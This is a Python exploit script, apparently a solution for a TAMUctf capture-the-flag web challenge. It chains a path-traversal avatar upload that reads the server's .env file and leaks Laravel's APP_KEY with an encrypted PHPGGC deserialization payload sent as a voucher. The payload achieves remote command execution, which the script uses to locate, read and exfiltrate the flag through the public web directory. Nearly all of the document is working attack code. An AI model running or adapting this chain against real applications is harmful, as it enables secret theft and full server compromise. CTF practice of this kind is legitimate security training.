#!/usr/bin/env python3
import base64
import os
import random
import re
import shlex
import shutil
import string
import subprocess

import requests

BASE_URL = os.getenv(
    'BASE_URL',
    'https://0c28d56a-dae2-4aa6-9eb3-bbc6cd09d9d6.tamuctf.com',
)
PASSWORD = os.getenv('USER_PASSWORD', 'P@ssw0rd123!')
PHPGGC = os.getenv('PHPGGC', 'tools/phpggc/phpggc')
TIMEOUT = 20
FLAG_RE = re.compile(r'gigem\{[^}\n]+\}')

TINY_PNG = base64.b64decode(
    'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO7Z0XcAAAAASUVORK5CYII='
)

ENCRYPT_SNIPPET = r"""
$key = $argv[1];
if (str_starts_with($key, 'base64:')) {
    $key = base64_decode(substr($key, 7));
}
$cipher = 'aes-256-cbc';
$payload = stream_get_contents(STDIN);
$iv = random_bytes(openssl_cipher_iv_length(strtolower($cipher)));
$value = openssl_encrypt($payload, strtolower($cipher), $key, 0, $iv, $tag);
$iv = base64_encode($iv);
$tag = base64_encode($tag ?? '');
$mac = hash_hmac('sha256', $iv.$value, $key);
echo base64_encode(json_encode(compact('iv', 'value', 'mac', 'tag'), JSON_UNESCAPED_SLASHES));
"""


def rand_user(prefix: str = 'u') -> str:
    alphabet = string.ascii_lowercase + string.digits
    return prefix + ''.join(random.choice(alphabet) for _ in range(8))


def require_tool(name: str) -> None:
    if shutil.which(name) is None:
        raise RuntimeError(f'missing required tool: {name}')


def require_file(path: str) -> None:
    if not os.path.exists(path):
        raise RuntimeError(f'missing required file: {path}')


def parse_hidden_token(html: str) -> str:
    m = re.search(r'name="_token" value="([^"]+)"', html)
    if not m:
        raise RuntimeError('could not find form CSRF token')
    return m.group(1)


def parse_meta_token(html: str) -> str:
    m = re.search(r'name="csrf-token" content="([^"]+)"', html)
    if not m:
        raise RuntimeError('could not find meta CSRF token')
    return m.group(1)


def make_session() -> requests.Session:
    sess = requests.Session()
    sess.headers['User-Agent'] = 'Mozilla/5.0'
    return sess


def register_and_login(
    sess: requests.Session,
    username: str,
    password: str,
) -> None:
    r = sess.get(f'{BASE_URL}/register', timeout=TIMEOUT)
    token = parse_hidden_token(r.text)
    r = sess.post(
        f'{BASE_URL}/register',
        data={
            '_token': token,
            'username': username,
            'password': password,
            'password2': password,
        },
        allow_redirects=False,
        timeout=TIMEOUT,
    )
    if r.status_code not in (302, 303):
        raise RuntimeError(f'register failed: HTTP {r.status_code}')

    r = sess.get(f'{BASE_URL}/login', timeout=TIMEOUT)
    token = parse_hidden_token(r.text)
    r = sess.post(
        f'{BASE_URL}/login',
        data={
            '_token': token,
            'username': username,
            'password': password,
        },
        allow_redirects=False,
        timeout=TIMEOUT,
    )
    if r.status_code not in (302, 303):
        raise RuntimeError(f'login failed: HTTP {r.status_code}')


def account_csrf(sess: requests.Session) -> str:
    r = sess.get(f'{BASE_URL}/account', timeout=TIMEOUT)
    if r.status_code != 200:
        raise RuntimeError(f'/account failed: HTTP {r.status_code}')
    return parse_meta_token(r.text)


def vouchers_csrf(sess: requests.Session) -> str:
    r = sess.get(f'{BASE_URL}/vouchers', timeout=TIMEOUT)
    if r.status_code != 200:
        raise RuntimeError(f'/vouchers failed: HTTP {r.status_code}')
    return parse_meta_token(r.text)


def avatar_read(sess: requests.Session, target_path: str) -> str:
    token = account_csrf(sess)
    traversal = '../../../../../../' + target_path.lstrip('/')
    files = {'avatar': (traversal, TINY_PNG, 'image/png')}
    r = sess.post(
        f'{BASE_URL}/account/avatar',
        data={'_token': token},
        files=files,
        allow_redirects=False,
        timeout=TIMEOUT,
    )
    if r.status_code not in (302, 303):
        raise RuntimeError(f'avatar upload failed: HTTP {r.status_code}')

    r = sess.get(f'{BASE_URL}/avatar', timeout=TIMEOUT)
    if r.status_code != 200:
        raise RuntimeError(f'/avatar failed: HTTP {r.status_code}')
    return r.text


def leak_app_key(sess: requests.Session) -> str:
    env_text = avatar_read(sess, '/var/www/.env')
    m = re.search(r'^APP_KEY=(.+)$', env_text, re.MULTILINE)
    if not m:
        raise RuntimeError('APP_KEY not found in leaked .env')
    return m.group(1).strip()


def build_encrypted_payload(app_key: str, command: str) -> str:
    raw = subprocess.check_output(
        ['php', PHPGGC, 'Laravel/RCE22', 'system', command],
        cwd=os.getcwd(),
    )
    enc = subprocess.run(
        ['php', '-r', ENCRYPT_SNIPPET, app_key],
        input=raw,
        capture_output=True,
        check=True,
    )
    return enc.stdout.decode().strip()


def redeem_payload(sess: requests.Session, payload: str) -> int:
    token = vouchers_csrf(sess)
    r = sess.post(
        f'{BASE_URL}/vouchers/redeem',
        data={'_token': token, 'voucher': payload},
        allow_redirects=False,
        timeout=TIMEOUT,
    )
    return r.status_code


def run_command(sess: requests.Session, app_key: str, command: str) -> int:
    payload = build_encrypted_payload(app_key, command)
    return redeem_payload(sess, payload)


def fetch_public(path: str) -> str:
    r = requests.get(f'{BASE_URL}{path}', timeout=TIMEOUT)
    if r.status_code != 200:
        raise RuntimeError(f'failed to fetch {path}: HTTP {r.status_code}')
    return r.text


def main() -> int:
    require_tool('php')
    require_file(PHPGGC)

    sess = make_session()
    username = rand_user()
    register_and_login(sess, username, PASSWORD)
    print(f'[+] logged in as {username}')

    app_key = leak_app_key(sess)
    print(f'[+] leaked APP_KEY: {app_key}')

    status = run_command(sess, app_key, 'id > /var/www/public/pwned.txt 2>&1')
    print(f'[+] benign RCE test returned HTTP {status}')
    print(fetch_public('/pwned.txt').strip())

    status = run_command(
        sess,
        app_key,
        'find / -maxdepth 1 -name "*flag.txt" -print > /var/www/public/flagpath.txt 2>&1',
    )
    print(f'[+] flag-path enumeration returned HTTP {status}')
    flag_path = fetch_public('/flagpath.txt').strip().splitlines()[-1]
    print(f'[+] flag path: {flag_path}')

    status = run_command(
        sess,
        app_key,
        f'cat {shlex.quote(flag_path)} > /var/www/public/realflag.txt 2>&1',
    )
    print(f'[+] flag read returned HTTP {status}')
    flag_text = fetch_public('/realflag.txt')
    m = FLAG_RE.search(flag_text)
    if not m:
        raise RuntimeError('flag not found in /realflag.txt')
    print(m.group(0))

    try:
        cleanup = (
            'rm -f /var/www/public/pwned.txt '
            '/var/www/public/flagpath.txt '
            '/var/www/public/realflag.txt'
        )
        run_command(sess, app_key, cleanup)
    except Exception:
        pass

    return 0


if __name__ == '__main__':
    raise SystemExit(main())
